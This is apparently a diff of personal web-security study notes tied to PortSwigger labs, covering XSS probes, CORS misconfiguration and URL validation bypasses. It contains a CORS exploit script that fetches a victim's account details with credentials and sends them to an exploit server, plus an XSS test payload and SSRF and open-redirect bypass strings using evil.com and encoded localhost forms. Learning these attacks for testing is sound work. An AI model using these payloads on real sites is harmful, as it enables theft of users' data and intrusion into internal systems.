@@ -12,7 +12,7 @@ XSS types
 ### Reflected or Stored XSS 
 - First do the spider or  katana to do  crawling
 - XSS on Wordpress
-- Check this everywhere in every input or anything having params or lin: `<img src=0 onerror='alert(1)'>`
+- Check this everywhere in every input or anything having params or link tag: `<img src=0 onerror='alert(1)'>`
 - encode URL encode/base64 once or twice for the payload upto 5 times
 - payload file use fuzzing to find xss
 - check CSP if it allows it
@@ -232,6 +232,7 @@ Also it refers to the source where js can be executed like `self`
 
 
 #### CORS:
+
 Cross origin resource: It tells what resource to access depending upon the header and origin provided. 
 - Shodan can be used to check ACAO or other very easily. Query : `"Access-Control-Allow-Origin: null"`
 - URL 'Origin: http://example.com`.hackxor.net/'(safari) is parses as Origin: http://example.com or 'Origin: http://example.com_hackxor.net/' (firefox or chrome)
@@ -253,11 +254,11 @@ Access-Control-Allow-credentials: true # allow cookies
 - Access-Control-Allow-Headers: Lists the custom headers (e.g., X-PINGOTHER, Content-Type) that the client is allowed to send in cross-origin requests. This ensures compatibility with server expectations.
 
 - Access-Control-Allow-credentials: Indicates whether the resource allows sending credentials (e.g., cookies) in cross-origin requests. This is often used for authentication purposes. When set to false, cookie or csrf token cannot be stolen
-  
 
-
+- Does not work in firefox but works at chrome
 - SOP (Same Origin Policy): has 3 parts: protocol + domain + port.
 - Check using different value of `origin` and different protocol like `http(s)` in request header to see if we get ACAO
+    Intercept all traffic and exploit via man in the middle: https://portswigger.net/web-security/cors , section: Breaking TLS with poorly configured CORS
 - dynamic gereration of ACAO using wildcard
   * Some origin starts with is vulnerable https://btc.net.evil.net
   * some origin ends with is also vulnerable 
@@ -265,36 +266,66 @@ Access-Control-Allow-credentials: true # allow cookies
   * Null origin is also vulnerable
     * `ACAO: null`, `ACAC: true` is very dangerous
     * iframe has sandbox when used gives origin null which has ACAO set to null
+    *  Cross-origin redirects.
+    *  Requests from serialized data.
+    *  Request using the file: protocol. 
     * null origin is same as `*` and more dangerous as `*`
-      * `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>*cors stuff here*</script>’></iframe>`
+      * `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> cors request here</script>"></iframe>`
   
   * with origin as `*` or `null`, ACAC is not applicable hence set to false automatically, also the website has to do setup of ACAO with wildcard or something and that is the reason that it is dynamically generated
   * `*.mysite.com` (all subdomain) in ACAO is also vulnerable if any of your subdomain is vulnerable
-  * Indication where dynamic header is used is to check if the origin is not given in request but AC headers are there in response and
-  * ACAO is not sent in response by most of server when origin is not given in request
+    ```
+      https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+    ```
+    solve this once again: https://portswigger.net/web-security/cors/lab-breaking-https-attack
+  * Indication where dynamic header is used, is to check if the origin is not given in request but AC headers are there in response and
+  * ACAO is not sent in response by most of server when origin is not given in request so check with origin request header to get if CORS header are there in response
   * `ACAC` is false by default
 - Developer gold
   - Specifiying this static header call `Vary:Origin` if dynamic header are used
   - Even w3 sites do not have this header. haha
   - cache poisioning: client side
-- `HttpOnly` flag is responisble for sharing cookies across all subdomain of a domain.
+- `HttpOnly` flag is responisble for sharing cookies across all subdomain of a domain. if set: cannot read document.cookie
 - Payload for victim
   ```
-    var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
-    req.withCredentials = true;
-    req.send();
-
-    function reqListener() {
-        location='//malicious-website.com/log?key='+this.responseText;
-    };
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('get','https://0a36001603054e9880ee94d90099005b.web-security-academy.net/accountDetails',true);
+      req.withCredentials = true;
+      <!-- req.setRequestHeader('Origin', 'null'); -->
+  
+      req.send();
+  
+      function reqListener() {
+        console.log(window.location)
+          window.location='https://exploit-0a7b00a703db4e8f808793a201010000.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+      };
   ```
   resolve this lab: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack 
 - Ref: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
 
+- URL validation bypass cheatsheet: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
+
+### IP ADDRESS BYPASS
+- Applications decode URLs incorrectly or don't normalize input before validation.
+%68%74%74%70%73://example.com	Encoded https://example.com.
+https://evil.com%00.example.com	Null byte terminates validation checks.
+https://%65%78%61%6D%70%6C%65.com	Encoded domain (e.g., example.com).
+http://127.0.0.1%09.evil.com	Tab-separated subdomain.
 
 
+- Applications whitelist specific IPs or validate hostnames but fail to account for all IP formats.
+http://2130706433	Decimal form of 127.0.0.1.
+'http://0x7f000001'	Hexadecimal form of 127.0.0.1. 
+http://017700000001	Octal form of 127.0.0.1.
+http://127.0.1	    Shortened version of 127.0.0.1.
+    Applications redirect users based on unvalidated URLs, leading to open redirects.
 
+- Bypass Techniques:Applications redirect users based on unvalidated URLs, leading to open redirects.
 
+https://example.com/?url=http://evil.com	Unvalidated URL in parameters.
+https://evil.com/redirect?to=https://example.com	Redirection chain abuse.
+https://example.com/%2f%2fevil.com	Encoded //evil.com bypasses.
+
+- Fragment identifiers (#) are ignored by servers but used by browsers.
 		
